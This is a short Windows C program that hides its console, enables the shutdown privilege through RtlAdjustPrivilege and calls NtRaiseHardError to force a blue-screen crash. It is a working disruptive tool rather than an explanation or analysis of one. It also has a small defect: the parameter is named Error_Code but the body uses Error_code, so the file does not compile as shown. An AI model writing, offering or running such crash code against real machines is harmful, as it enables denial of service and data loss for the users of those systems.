#include <Windows.h>
#include <winternl.h>

// Declaration of RtlAdjustPrivilege and NtRaiseHardError
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

// Get function pointer to ntdll.dll
HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

// Simplified function to set and unset privilege
NTSTATUS Set_Privilege(ULONG perm, BOOLEAN enable, BOOLEAN current_thread)
{
    BOOLEAN enabled;
    return RtlAdjustPrivilege(perm, enable, current_thread, &enabled);
}

// Simplified function to trigger bsod
NTSTATUS Trigger_BSOD(NTSTATUS Error_Code)
{
    ULONG response;
    return NtRaiseHardError(Error_code, 0, 0, 0, 6, &response);
}

VOID main()
{
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    // Check if get functions from ntdll.dll failed then exit.
    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL) { goto Cleanup; }
    // Get shutdown privilege and check the result
    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) { 
        Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. 
        goto Cleanup;
    }
    // Cleanup code
    Cleanup:
    if (ntdll) { FreeLibrary(ntdll); }
    ExitProcess(1);
}
